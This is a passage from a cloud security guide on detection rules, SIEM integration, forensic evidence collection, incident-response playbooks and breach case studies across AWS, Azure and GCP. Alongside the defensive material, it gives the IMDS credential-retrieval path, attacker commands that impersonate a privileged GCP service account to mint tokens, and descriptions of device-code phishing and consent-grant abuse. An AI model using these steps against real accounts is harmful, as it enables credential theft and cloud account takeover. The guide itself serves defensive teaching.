# Create an alerting policy on the metric
gcloud alpha monitoring policies create \
  --display-name="Service Account Key Created" \
  --condition-display-name="SA Key Creation Spike" \
  --condition-filter='metric.type="logging.googleapis.com/user/sa-key-creation"' \
  --condition-threshold-value=0 \
  --condition-threshold-comparison=COMPARISON_GT \
  --notification-channels="projects/<project>/notificationChannels/<channel-id>" \
  --combiner=OR \
  --duration=0s
```

### 8.3 SIEM integration patterns

Centralizing cloud logs into a SIEM enables cross-cloud correlation, long-term retention, and unified detection logic.

**CloudTrail to Splunk.** The standard integration uses an S3 bucket as the CloudTrail destination, with SNS notifications triggering a Splunk HTTP Event Collector (HEC) ingestion pipeline or a Splunk SQS-based input. The Splunk Add-on for AWS (`Splunk_TA_aws`) handles parsing and CIM mapping.

```bash
# Configure CloudTrail to deliver to S3 with SNS notification
aws cloudtrail update-trail \
  --name management-events \
  --s3-bucket-name security-logs-centralized \
  --sns-topic-name arn:aws:sns:us-east-1:123456789012:CloudTrailNotify \
  --is-multi-region-trail \
  --enable-log-file-validation

# Verify delivery
aws cloudtrail get-trail-status --name management-events \
  --query '{LatestDeliveryTime: LatestDeliveryTime, IsLogging: IsLogging}'
```

**Azure Activity Log to Microsoft Sentinel.** Azure Activity Logs and Azure AD sign-in logs connect to Sentinel via diagnostic settings that route to the Log Analytics workspace where Sentinel is enabled. Sentinel provides built-in analytics rules for common cloud attacker techniques.

```bash
# Enable diagnostic settings to send Activity Logs to Log Analytics
az monitor diagnostic-settings create \
  --name "ActivityToSentinel" \
  --resource "/subscriptions/<sub-id>" \
  --workspace "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.OperationalInsights/workspaces/SentinelWorkspace" \
  --logs '[{"category": "Administrative", "enabled": true}, {"category": "Security", "enabled": true}, {"category": "Policy", "enabled": true}]'

# Connect Azure AD sign-in logs (requires P1/P2 license)
az monitor diagnostic-settings create \
  --name "AADSignInToSentinel" \
  --resource "/providers/Microsoft.AAD" \
  --workspace "/subscriptions/<sub-id>/resourceGroups/SecurityRG/providers/Microsoft.OperationalInsights/workspaces/SentinelWorkspace" \
  --logs '[{"category": "SignInLogs", "enabled": true}, {"category": "AuditLogs", "enabled": true}]'
```

**GCP Cloud Audit Logs to Chronicle.** Google Chronicle (now part of Google Security Operations) ingests GCP audit logs natively through an organizational log sink that routes to Chronicle's ingestion API. Chronicle normalizes events into its Unified Data Model (UDM) and supports YARA-L detection rules.

```bash
# Create organization-level log sink to Chronicle
gcloud logging sinks create chronicle-ingestion \
  "chronicle.googleapis.com/projects/<chronicle-project>/locations/us/instances/<instance>/logTypes/GCP_CLOUDAUDIT" \
  --organization=<org-id> \
  --include-children \
  --log-filter='logName:"cloudaudit.googleapis.com"'

# Grant the sink's service account write access
gcloud projects add-iam-policy-binding <chronicle-project> \
  --member="serviceAccount:<sink-writer-sa>" \
  --role="roles/chronicle.editor"
```

### 8.4 SSRF and IMDS attack detection

Server-Side Request Forgery targeting the Instance Metadata Service is the single most impactful cloud attack vector, because a successful SSRF-to-IMDS chain yields IAM credentials that grant network-independent access to cloud APIs. Detection must cover both the SSRF attempt and the subsequent credential use.

**Detecting IMDSv1 exploitation.** IMDSv1 responds to simple HTTP GET requests without a session token. Any application that makes an HTTP request to `169.254.169.254` with a `GET` method is potentially being exploited via SSRF. VPC Flow Logs capture connections to the link-local address, but only at the network layer — they cannot distinguish legitimate SDK metadata calls from SSRF-triggered calls.

```bash
# AWS: query VPC Flow Logs for connections to IMDS
aws ec2 describe-flow-logs --query 'FlowLogs[*].[FlowLogId,LogGroupName]'

# In CloudWatch Logs Insights, query for IMDS connections
# (Flow Logs must be delivered to CloudWatch)
aws logs start-query \
  --log-group-name VPCFlowLogs \
  --start-time $(date -d '24 hours ago' +%s) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp, srcAddr, dstAddr, dstPort
    | filter dstAddr = "169.254.169.254"
    | sort @timestamp desc
    | limit 100'
```

**Detecting credential use from outside the instance.** The most reliable detection is monitoring for IAM credentials (issued by the instance metadata service) being used from an IP address that is not the instance's own IP. When IMDS credentials appear in CloudTrail, the `sourceIPAddress` field should match the instance's private or public IP. A mismatch indicates credential theft.

```sql
-- CloudTrail Lake: detect IMDS-issued credentials used from non-instance IPs
SELECT eventTime, userIdentity.arn, sourceIPAddress,
       userIdentity.sessionContext.sessionIssuer.arn as roleArn,
       eventName, eventSource
FROM <EVENT_DATA_STORE_ID>
WHERE userIdentity.type = 'AssumedRole'
AND userIdentity.sessionContext.sessionIssuer.type = 'Role'
AND sourceIPAddress NOT LIKE '10.%'
AND sourceIPAddress NOT LIKE '172.1%'
AND sourceIPAddress NOT LIKE '172.2%'
AND sourceIPAddress NOT LIKE '172.3%'
AND sourceIPAddress NOT LIKE '192.168.%'
AND sourceIPAddress != 'AWS Internal'
ORDER BY eventTime DESC
```

**GCP metadata header enforcement detection.** GCP's metadata server requires the `Metadata-Flavor: Google` header. SSRF attacks that cannot set custom headers are blocked. However, if the SSRF vulnerability allows header injection, the protection is bypassed. Detect unusual metadata API calls by monitoring VPC flow logs for traffic to `metadata.google.internal` (169.254.169.254 on GCP) from workloads that should use Workload Identity instead.

```bash
# GCP: query VPC Flow Logs for metadata service access
gcloud logging read \
  'resource.type="gce_subnetwork" AND
   jsonPayload.connection.dest_ip="169.254.169.254"' \
  --project=<project-id> \
  --freshness=24h \
  --format="table(timestamp, jsonPayload.connection.src_ip, jsonPayload.connection.dest_port)"
```

### 8.5 Cloud-native threat detection service comparison

All three major providers offer managed threat detection services that analyze audit logs, network flow data, and sometimes DNS queries to identify attacker activity without requiring customer-managed detection rules.

| Capability | AWS GuardDuty | GCP Security Command Center | Azure Defender for Cloud |
|------------|--------------|---------------------------|------------------------|
| **Log sources** | CloudTrail, VPC Flow, DNS, S3 data events, EKS audit | Cloud Audit Logs, VPC Flow, Security Health Analytics | Activity Log, Defender signals, Azure AD, NSG Flow |
| **IAM threat detection** | Compromised credentials, unusual API calls | IAM anomalies, service account abuse | Risky sign-ins, impossible travel, anomalous token |
| **Network detection** | Port scanning, C2 callbacks, crypto mining | Open firewall rules, public IPs on sensitive workloads | Brute force, lateral movement, anomalous outbound |
| **Malware detection** | GuardDuty Malware Protection (EBS scan) | Web Security Scanner | Defender for Servers (MDE-based) |
| **Container detection** | EKS Runtime Monitoring | GKE Threat Detection | Defender for Containers |
| **Pricing model** | Per-event volume (data analyzed) | Free tier (SHA) + Premium tier (Event Threat Detection) | Per-resource per-month |
| **Custom rules** | Suppression filters only (no custom logic) | Custom modules via SCC API | Custom analytics in Sentinel (separate) |
| **Response automation** | EventBridge → Lambda/Step Functions | Cloud Functions via Pub/Sub notifications | Logic Apps / Sentinel playbooks |

GuardDuty excels at credential-abuse detection because it correlates CloudTrail principal behavior with IP reputation and impossible-travel analysis. Security Command Center's strength is its integration with Organization Policy and Binary Authorization for preventive controls. Defender for Cloud provides the tightest integration with Azure AD identity signals, making it strongest for identity-based attacks.

---

## 9. Cloud forensics and incident response

Cloud incident response requires different evidence collection procedures than on-premises forensics. Physical disk access is impossible; instead, responders work with API-acquired snapshots, log exports, and metadata queries. The chain of custody depends on immutable log storage, snapshot checksums, and audit-trail evidence of evidence collection.

### 9.1 AWS incident response procedures

**CloudTrail log analysis.** CloudTrail is the primary evidence source for AWS incidents. Every management-plane API call (and optionally data-plane calls for S3 and Lambda) produces a CloudTrail event. For historical analysis beyond the 90-day Event History, events must be delivered to an S3 bucket or CloudTrail Lake event data store.

```bash
# Look up recent events for a compromised IAM user
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=compromised-user \
  --start-time "2026-05-01T00:00:00Z" \
  --end-time "2026-05-13T23:59:59Z" \
  --max-results 50

# Query CloudTrail Lake for all actions by a specific access key
aws cloudtrail start-query \
  --query-statement "SELECT eventTime, eventName, eventSource, sourceIPAddress,
    userIdentity.arn, requestParameters, responseElements
    FROM <EVENT_DATA_STORE_ID>
    WHERE userIdentity.accessKeyId = 'AKIA...'
    ORDER BY eventTime ASC"

# Get query results
aws cloudtrail get-query-results --query-id <query-id>
```

**S3 access log forensics.** S3 server access logs record every request to a bucket, including the requester, bucket name, key, operation, HTTP status, and bytes transferred. For data exfiltration investigations, S3 access logs reveal exactly which objects were downloaded, by whom, and when.

```bash
# Enable S3 server access logging on the target bucket
aws s3api put-bucket-logging \
  --bucket compromised-data-bucket \
  --bucket-logging-status '{
    "LoggingEnabled": {
      "TargetBucket": "s3-access-logs-bucket",
      "TargetPrefix": "compromised-data-bucket/"
    }
  }'

# Analyze S3 access logs with Athena
# (assumes logs are already being collected)
aws athena start-query-execution \
  --query-string "SELECT request_datetime, remote_ip, requester,
    key, operation, http_status, bytes_sent
    FROM s3_access_logs
    WHERE bucket = 'compromised-data-bucket'
    AND operation IN ('REST.GET.OBJECT', 'REST.PUT.OBJECT', 'REST.COPY.OBJECT')
    AND request_datetime > timestamp '2026-05-01'
    ORDER BY request_datetime ASC" \
  --result-configuration OutputLocation=s3://athena-results/
```

**VPC Flow Log analysis.** VPC Flow Logs capture IP-level connection metadata (source/dest IP, port, protocol, bytes, action) for all traffic through ENIs. During an incident, flow logs reveal lateral movement, data exfiltration destinations, and command-and-control communication.

```bash
# Create a flow log for a specific VPC (if not already enabled)
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids vpc-0123456789abcdef0 \
  --traffic-type ALL \
  --log-destination-type s3 \
  --log-destination arn:aws:s3:::vpc-flow-logs-forensic/ \
  --max-aggregation-interval 60

# Query flow logs in CloudWatch Logs Insights
aws logs start-query \
  --log-group-name VPCFlowLogs \
  --start-time $(date -d '7 days ago' +%s) \
  --end-time $(date +%s) \
  --query-string 'fields @timestamp, srcAddr, dstAddr, dstPort, bytes, action
    | filter srcAddr = "10.0.1.47"
    | filter action = "ACCEPT"
    | sort bytes desc
    | limit 200'
```

**EBS snapshot acquisition for disk forensics.** When an EC2 instance is compromised, the first responder action is creating an EBS snapshot of all attached volumes before any remediation. The snapshot preserves the disk state at the time of acquisition for offline forensic analysis.

```bash
# Identify volumes attached to the compromised instance
aws ec2 describe-instances \
  --instance-ids i-0compromised1234 \
  --query 'Reservations[*].Instances[*].BlockDeviceMappings[*].[DeviceName,Ebs.VolumeId]' \
  --output table

# Create forensic snapshots with descriptive tags
aws ec2 create-snapshot \
  --volume-id vol-0abc123def456 \
  --description "IR-2026-0513: forensic snapshot of compromised instance root volume" \
  --tag-specifications 'ResourceType=snapshot,Tags=[{Key=Incident,Value=IR-2026-0513},{Key=Purpose,Value=Forensics},{Key=AcquisitionTime,Value=2026-05-13T14:30:00Z}]'

# Copy snapshot to a forensic account (isolation)
aws ec2 copy-snapshot \
  --source-region us-east-1 \
  --source-snapshot-id snap-0forensic123 \
  --destination-region us-east-1 \
  --description "IR-2026-0513: cross-account forensic copy" \
  --profile forensic-account

# Share snapshot with forensic account
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-0forensic123 \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids 999888777666
```

### 9.2 Azure incident response procedures

**Unified Audit Log queries.** The Unified Audit Log in Microsoft 365 and Azure AD captures authentication events, mailbox access, file operations, and administrative changes. PowerShell's `Search-UnifiedAuditLog` cmdlet is the primary forensic query interface.

```powershell
# Connect to Exchange Online for Unified Audit Log access
Connect-ExchangeOnline -UserPrincipalName admin@contoso.com

# Search for all activity by a compromised user
$results = Search-UnifiedAuditLog `
  -StartDate "2026-05-01" `
  -EndDate "2026-05-13" `
  -UserIds "compromised.user@contoso.com" `
  -ResultSize 5000

# Export results for offline analysis
$results | Select-Object CreationDate, Operations, UserIds, AuditData |
  Export-Csv -Path "C:\IR\unified-audit-compromised-user.csv" -NoTypeInformation

# Search for specific high-risk operations
Search-UnifiedAuditLog `
  -StartDate "2026-05-01" `
  -EndDate "2026-05-13" `
  -Operations "Add-MailboxPermission","Set-Mailbox","New-InboxRule","Set-ConditionalAccessPolicy" `
  -ResultSize 5000 |
  Select-Object CreationDate, Operations, UserIds, AuditData
```

**Azure AD sign-in log analysis.** Sign-in logs capture every authentication event, including the client IP, device details, conditional access evaluation results, MFA status, and risk assessment. During an incident, sign-in logs reveal compromised credentials, impossible travel, and conditional access bypass.

```bash
# Query Azure AD sign-in logs via Azure CLI
az monitor activity-log list \
  --start-time "2026-05-01T00:00:00Z" \
  --offset 12d \
  --caller "compromised.user@contoso.com" \
  --output table

# Query sign-in logs via Graph API (requires appropriate permissions)
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?\$filter=userPrincipalName eq 'compromised.user@contoso.com' and createdDateTime ge 2026-05-01T00:00:00Z" \
  --output json
```

**NSG flow logs and disk snapshots.** Network Security Group flow logs capture network connection metadata for Azure VMs. Disk snapshots preserve VM state for forensic analysis.

```bash
# Create a snapshot of a compromised VM's OS disk
az snapshot create \
  --name "ir-2026-0513-compromised-vm-osdisk" \
  --resource-group ForensicsRG \
  --source "/subscriptions/<sub-id>/resourceGroups/ProdRG/providers/Microsoft.Compute/disks/compromised-vm-osdisk" \
  --tags Incident=IR-2026-0513 Purpose=Forensics AcquisitionTime=2026-05-13T14:30:00Z

# Export NSG flow logs for analysis
az network watcher flow-log show \
  --resource-group ProdRG \
  --nsg compromised-vm-nsg \
  --output json

# Query NSG flow logs in Log Analytics (KQL via Sentinel)
az monitor log-analytics query \
  --workspace <workspace-id> \
  --analytics-query "AzureNetworkAnalytics_CL
    | where SrcIP_s == '10.0.1.47'
    | where FlowStatus_s == 'A'
    | project TimeGenerated, SrcIP_s, DestIP_s, DestPort_d, TotalBytes_d
    | sort by TotalBytes_d desc
    | take 200"
```

### 9.3 GCP incident response procedures

**Admin Activity audit log queries.** GCP Admin Activity audit logs capture all API calls that modify resources (create, update, delete). These logs are always enabled and cannot be disabled by the customer, making them a reliable forensic source even when an attacker has administrative access.

```bash
# Query Admin Activity logs for a specific principal
gcloud logging read \
  'protoPayload.authenticationInfo.principalEmail="compromised-sa@project.iam.gserviceaccount.com"
   AND logName:"cloudaudit.googleapis.com%2Factivity"' \
  --project=<project-id> \
  --freshness=14d \
  --format="table(timestamp, protoPayload.methodName, protoPayload.resourceName, protoPayload.authenticationInfo.principalEmail)" \
  --limit=500

# Export logs to BigQuery for complex forensic analysis
gcloud logging sinks create forensic-export \
  "bigquery.googleapis.com/projects/<project>/datasets/incident_logs" \
  --log-filter='protoPayload.authenticationInfo.principalEmail="compromised-sa@project.iam.gserviceaccount.com"' \
  --project=<project-id>

# Query exported logs in BigQuery for lateral movement patterns
bq query --use_legacy_sql=false \
  'SELECT timestamp, protopayload_auditlog.methodName,
    protopayload_auditlog.resourceName,
    protopayload_auditlog.authenticationInfo.principalEmail
   FROM `project.incident_logs.cloudaudit_googleapis_com_activity_*`
   WHERE protopayload_auditlog.methodName LIKE "%SetIamPolicy%"
   ORDER BY timestamp ASC'
```

**GCP disk snapshot forensics.** Compute Engine persistent disk snapshots work similarly to AWS EBS snapshots. Snapshots are global resources and can be shared across projects for isolated forensic analysis.

```bash
# Create a forensic snapshot of the compromised instance's boot disk
gcloud compute disks snapshot compromised-vm-boot-disk \
  --zone=us-central1-a \
  --snapshot-names=ir-2026-0513-boot-forensic \
  --description="IR-2026-0513: forensic acquisition of compromised VM boot disk" \
  --project=<project-id>

# Share the snapshot with the forensic project
gcloud compute snapshots add-iam-policy-binding ir-2026-0513-boot-forensic \
  --member="serviceAccount:forensic-analyst@forensic-project.iam.gserviceaccount.com" \
  --role="roles/compute.storageAdmin" \
  --project=<project-id>

# Create a forensic analysis disk from the snapshot in the forensic project
gcloud compute disks create ir-2026-0513-analysis-disk \
  --source-snapshot="projects/<source-project>/global/snapshots/ir-2026-0513-boot-forensic" \
  --zone=us-central1-a \
  --project=forensic-project
```

### 9.4 Cross-cloud evidence preservation

When an incident spans multiple cloud providers, evidence preservation must be coordinated across all affected environments simultaneously to prevent evidence destruction.

**Log export and retention verification.** Before any remediation action, responders must verify that logs covering the incident timeframe are preserved in immutable storage. Each provider handles log retention differently, and attackers may have modified retention settings during the intrusion.

```bash
# AWS: verify CloudTrail log file integrity validation
aws cloudtrail get-trail \
  --name management-events \
  --query '{LogFileValidationEnabled: LogFileValidationEnabled, S3BucketName: S3BucketName}'

# AWS: verify S3 Object Lock on the log bucket (prevents deletion)
aws s3api get-object-lock-configuration --bucket security-logs-centralized

# Azure: verify immutable storage on the log storage account
az storage container immutability-policy show \
  --account-name securitylogs \
  --container-name activity-logs

# GCP: verify retention policy on the log bucket
gcloud storage buckets describe gs://security-audit-logs \
  --format="json(retentionPolicy)"
```

**Legal hold procedures.** When an incident may involve litigation, regulatory investigation, or law enforcement referral, legal hold must be applied to all evidence storage to prevent automatic lifecycle deletion.

```bash
# AWS: enable S3 Object Lock legal hold on specific log objects
aws s3api put-object-legal-hold \
  --bucket security-logs-centralized \
  --key "AWSLogs/123456789012/CloudTrail/us-east-1/2026/05/13/" \
  --legal-hold Status=ON

# GCP: set a retention policy lock (irreversible — cannot be reduced or removed)
gcloud storage buckets update gs://security-audit-logs \
  --lock-retention-period
```

### 9.5 Cloud incident response playbooks

**Playbook 1 — Compromised IAM credential response.**

The responder must act under the assumption that the attacker is actively using the credential and may be monitoring remediation actions. The sequence matters: disable first, then investigate.

```bash
# Step 1: Disable the compromised access key immediately
aws iam update-access-key \
  --user-name compromised-user \
  --access-key-id AKIA... \
  --status Inactive

# Step 2: Create a new access key for the legitimate user (if needed)
# (Do NOT do this until the user's workstation is verified clean)

# Step 3: Query all actions performed with the compromised key
aws cloudtrail start-query \
  --query-statement "SELECT eventTime, eventName, eventSource, sourceIPAddress,
    requestParameters, responseElements, errorCode
    FROM <EVENT_DATA_STORE_ID>
    WHERE userIdentity.accessKeyId = 'AKIA...'
    ORDER BY eventTime ASC"

# Step 4: Check for persistence mechanisms created by the attacker
aws iam list-access-keys --user-name compromised-user
aws iam list-attached-user-policies --user-name compromised-user
aws iam list-user-policies --user-name compromised-user

# Step 5: Check for backdoor roles or policies
aws cloudtrail start-query \
  --query-statement "SELECT eventTime, eventName, requestParameters
    FROM <EVENT_DATA_STORE_ID>
    WHERE userIdentity.accessKeyId = 'AKIA...'
    AND eventName IN ('CreateRole', 'CreatePolicy', 'CreatePolicyVersion',
      'AttachRolePolicy', 'PutRolePolicy', 'CreateUser', 'CreateAccessKey',
      'CreateLoginProfile', 'UpdateAssumeRolePolicy')
    ORDER BY eventTime ASC"
```

**Playbook 2 — Cryptomining detection and response.** Cryptomining is the most common consequence of compromised cloud credentials. Attackers launch large GPU or high-CPU instances in regions where the victim has no infrastructure to avoid detection. The cost impact can reach tens of thousands of dollars per day.

```bash
# Detect: find EC2 instances launched in unusual regions
aws ec2 describe-instances \
  --region ap-southeast-1 \
  --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,LaunchTime,State.Name]' \
  --output table
# Repeat for all regions the organization does not normally use

# Detect: find large instance types (common mining types)
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  echo "=== $region ==="
  aws ec2 describe-instances --region "$region" \
    --filters "Name=instance-type,Values=p3.*,p4d.*,g4dn.*,g5.*,c5.*,c6i.*" \
    --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,LaunchTime]' \
    --output table 2>/dev/null
done

# Respond: terminate rogue instances
aws ec2 terminate-instances --instance-ids i-0rogue1234 --region ap-southeast-1

# Contain: apply SCP to block instance launches in unused regions
# (apply to the organization root or target OUs)
```

**Playbook 3 — Data exfiltration investigation.** When data exfiltration is suspected, the investigation must determine what data was accessed, how much was transferred, and where it went.

```bash
# Identify S3 GetObject calls by the compromised principal
aws cloudtrail start-query \
  --query-statement "SELECT eventTime, requestParameters.bucketName,
    requestParameters.key, sourceIPAddress, bytesTransferredOut
    FROM <EVENT_DATA_STORE_ID>
    WHERE eventName = 'GetObject'
    AND userIdentity.arn LIKE '%compromised%'
    ORDER BY eventTime ASC"

# Check for bucket policy changes that may have enabled external access
aws cloudtrail start-query \
  --query-statement "SELECT eventTime, requestParameters.bucketName,
    requestParameters.bucketPolicy, sourceIPAddress
    FROM <EVENT_DATA_STORE_ID>
    WHERE eventName IN ('PutBucketPolicy', 'PutBucketAcl',
      'DeletePublicAccessBlock')
    AND userIdentity.arn LIKE '%compromised%'
    ORDER BY eventTime ASC"

# Check for snapshot sharing (exfiltration via shared EBS/RDS snapshots)
aws cloudtrail start-query \
  --query-statement "SELECT eventTime, eventName, requestParameters
    FROM <EVENT_DATA_STORE_ID>
    WHERE eventName IN ('ModifySnapshotAttribute', 'ModifyDBSnapshotAttribute')
    AND userIdentity.arn LIKE '%compromised%'
    ORDER BY eventTime ASC"
```

---

## 10. Cloud attack chains and case studies

Real-world cloud breaches demonstrate that individual misconfigurations become catastrophic when they chain together. Each case study below reconstructs the full attack path, identifies the root cause, and maps the chain to defensive gaps.

### 10.1 Capital One breach (2019): SSRF to IMDS to S3

The Capital One breach remains the canonical cloud-native attack chain. The attacker, a former AWS employee, exploited a Server-Side Request Forgery vulnerability in a misconfigured WAF (ModSecurity) running on an EC2 instance behind a load balancer. The attack chain proceeded through four distinct stages.

**Stage 1 — SSRF exploitation.** The WAF instance was configured to proxy requests, and a misconfigured ModSecurity rule allowed the attacker to send crafted HTTP requests that caused the WAF to make arbitrary HTTP calls. The attacker directed these calls to the EC2 instance metadata service at `169.254.169.254`.

**Stage 2 — IMDS credential theft.** The instance was running IMDSv1, which responded to unauthenticated GET requests. The SSRF allowed the attacker to retrieve the temporary IAM credentials assigned to the instance's IAM role by querying `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. The response contained an access key, secret key, and session token.

**Stage 3 — S3 enumeration and exfiltration.** The stolen IAM credentials granted access to over 700 S3 buckets because the instance role had overly broad S3 permissions (`s3:GetObject` and `s3:ListBucket` on `*`). The attacker used the credentials from outside AWS to enumerate and download data from these buckets over multiple days.

**Stage 4 — Impact.** Approximately 100 million credit card applications (containing names, addresses, credit scores, and Social Security numbers) and 140,000 Social Security numbers were exfiltrated. Capital One disclosed the breach after receiving a tip through their responsible disclosure program.

**Root causes and lessons.** The breach resulted from three compounding failures: (1) a web application vulnerability (SSRF) in internet-facing infrastructure, (2) IMDSv1 without hop-limit restrictions, allowing the metadata service to respond to proxied requests, and (3) an overly permissive IAM role that granted broad S3 access to a WAF instance that had no business reading customer data. Any single fix — patching the SSRF, enforcing IMDSv2, or scoping the IAM role to least privilege — would have broken the chain.

### 10.2 SolarWinds SUNBURST: on-premises AD to cloud mailbox access

The SolarWinds supply chain attack (disclosed December 2020) demonstrated how on-premises Active Directory compromise chains into cloud services via SAML token forging. The attack is attributed to the Russian SVR (APT29/Cozy Bear) and affected approximately 18,000 SolarWinds Orion customers, with deep follow-on exploitation in approximately 100 organizations.

**Stage 1 — Supply chain compromise.** The attackers compromised the SolarWinds Orion build pipeline and inserted a backdoor (SUNBURST) into the software update. The trojanized update was distributed through SolarWinds' legitimate update mechanism and signed with SolarWinds' code signing certificate.

**Stage 2 — On-premises AD compromise.** Once SUNBURST was active on a victim's network, the attackers moved laterally to the Active Directory Federation Services (AD FS) server and exfiltrated the SAML token signing certificate (the private key stored in the AD FS configuration database).

**Stage 3 — Golden SAML.** With the SAML signing certificate, the attackers forged SAML assertions for any federated identity — including cloud service accounts that had never been compromised directly. The forged tokens were valid because they were signed by the legitimate signing key. This technique, called Golden SAML (by analogy with Kerberos Golden Ticket), bypasses all cloud-side authentication controls because the cloud identity provider trusts the federated assertion unconditionally.

**Stage 4 — Cloud mailbox and data access.** Using forged SAML tokens, the attackers authenticated to Microsoft 365 and Azure AD, accessed email mailboxes of senior executives and security personnel, and read internal communications about the ongoing investigation into SolarWinds itself. The attackers also accessed Azure AD application registrations and service principal credentials.

**Defensive gaps.** Organizations that stored the AD FS signing certificate in an HSM with non-exportable keys would have prevented the Golden SAML attack. Certificate rotation, monitoring for SAML assertion anomalies (assertions for users who did not authenticate through AD FS), and Azure AD Conditional Access policies requiring device compliance would have provided additional defensive layers.

### 10.3 Azure AD / Entra ID attack paths

Azure AD (now Entra ID) presents a rich attack surface because it serves as the identity provider for Microsoft 365, Azure resources, and thousands of federated SaaS applications. Several attack techniques target the intersection of Azure AD identity and cloud resource access.

**Primary Refresh Token (PRT) theft.** The PRT is a long-lived token stored on Azure AD joined or hybrid-joined devices. It provides SSO across Azure AD-integrated applications. An attacker with local administrator access on a device can extract the PRT using tools like ROADtoken or AADInternals and use it to authenticate as the device's user from another machine, bypassing device-compliance Conditional Access policies.

**Device code phishing.** Azure AD's device code authentication flow (OAuth 2.0 device authorization grant, RFC 8628) is designed for input-constrained devices. The attacker generates a device code via `https://login.microsoftonline.com/common/oauth2/devicecode`, sends the code to the victim (via email or chat), and the victim enters the code at `https://microsoft.com/devicelogin` thinking they are authenticating to a legitimate application. Once the victim completes authentication, the attacker receives a token set that includes a refresh token providing persistent access.

**Consent grant abuse (illicit consent grant).** An attacker creates a malicious Azure AD application registration in their own tenant, configures it to request broad permissions (Mail.Read, Files.ReadWrite, User.Read.All), and sends the victim a consent URL. When the victim (or an administrator) grants consent, the attacker's application gains API access to the victim's tenant data. Admin consent for high-privilege permissions grants the attacker persistent access that survives password changes.

**Detection for these attack paths:**

```kql
// Detect device code authentication flows
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| project TimeGenerated, UserPrincipalName, IPAddress, DeviceDetail,
    ConditionalAccessStatus, RiskState
| where RiskState != "none"

// Detect new OAuth application consent grants
AuditLogs
| where OperationName == "Consent to application"
| extend AppName = TargetResources[0].displayName
| extend Permissions = TargetResources[0].modifiedProperties
| project TimeGenerated, InitiatedBy, AppName, Permissions
```

### 10.4 GCP metadata exploitation and service account impersonation chains

GCP's IAM model allows service accounts to impersonate other service accounts via the `iam.serviceAccounts.getAccessToken` permission. This creates transitive trust chains where compromising a single service account with impersonation rights can cascade into full project or organization compromise.

**Impersonation chain example.** Service account A has `roles/iam.serviceAccountTokenCreator` on service account B. Service account B has `roles/owner` on the project. An attacker who compromises workload A can generate access tokens for B and gain Owner-level access.

```bash
# Attacker generates a token for the target service account
gcloud auth print-access-token \
  --impersonate-service-account=privileged-sa@project.iam.gserviceaccount.com

# Or via the API directly
curl -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privileged-sa@project.iam.gserviceaccount.com:generateAccessToken" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
```

**Metadata server exploitation.** GCP Compute Engine instances access the metadata server at `metadata.google.internal` (169.254.169.254). Unlike AWS IMDSv1, GCP requires a `Metadata-Flavor: Google` header. However, SSRF vulnerabilities that allow header injection bypass this protection entirely. The metadata server returns the default service account's access token, which the attacker can use from outside the instance.

**Detection — impersonation chain enumeration:**

```bash
# Enumerate all service account impersonation bindings in a project
gcloud projects get-iam-policy <project-id> \
  --format=json | \
  jq '.bindings[] | select(.role | contains("serviceAccountTokenCreator") or contains("serviceAccountUser"))'

# Audit impersonation events in audit logs
gcloud logging read \
  'protoPayload.methodName="GenerateAccessToken" OR
   protoPayload.methodName="GenerateIdToken" OR
   protoPayload.methodName="SignBlob"' \
  --project=<project-id> \
  --freshness=7d \
  --format="table(timestamp, protoPayload.authenticationInfo.principalEmail, protoPayload.request.name)"
```

### 10.5 AWS cross-account attack scenarios

**Confused deputy problem.** The confused deputy attack occurs when a trusted AWS service (the "deputy") is tricked into performing actions on behalf of an attacker. The classic scenario involves cross-account IAM roles without the `ExternalId` condition. An attacker discovers that service S assumes role R in victim account V by specifying V's account ID. If the trust policy on R does not require an `ExternalId`, the attacker configures their own instance of service S to assume R, gaining access to V's resources.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::SERVICE_ACCOUNT:root"},
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "unique-customer-secret-id"
      }
    }
  }]
}
```

The `ExternalId` condition is the standard mitigation. Without it, any customer of the service can assume any other customer's cross-account role. AWS documentation explicitly recommends `ExternalId` for all third-party cross-account access.

**Cross-account resource policy abuse.** S3 bucket policies, KMS key policies, SQS queue policies, and SNS topic policies all support cross-account access grants. An attacker who can modify these resource policies can grant their own external account access to the victim's data without modifying IAM policies (which are more heavily monitored).

### 10.6 Cloud-specific CVEs and exploitation context

**CVE-2023-23397 — Microsoft Outlook NTLM relay to Azure AD.** This vulnerability in Microsoft Outlook for Windows allowed an attacker to send a specially crafted email with a UNC path in a calendar reminder. When Outlook processed the reminder, it initiated an NTLM authentication to the attacker's server, leaking the victim's NTLMv2 hash. In a cloud context, attackers relayed these hashes to Azure AD endpoints that still accepted NTLM authentication, gaining access to the victim's cloud mailbox and Azure resources. Microsoft assigned a CVSS score of 9.8 (Critical). The exploitation was attributed to APT28 (GRU Unit 26165) targeting European government and military organizations. Remediation required both patching Outlook (KB5024919) and disabling NTLM where possible.

**CVE-2024-21893 — Ivanti Connect Secure SSRF for cloud metadata theft.** This server-side request forgery vulnerability in Ivanti Connect Secure (formerly Pulse Secure) VPN appliances allowed unauthenticated attackers to access internal resources through a vulnerable SAML component. In cloud-hosted deployments, attackers exploited this SSRF to reach the cloud instance metadata service and steal IAM credentials, following the same SSRF-to-IMDS chain as the Capital One breach. The vulnerability was actively exploited in the wild and added to CISA's Known Exploited Vulnerabilities catalog. CVSS 8.2 (High).

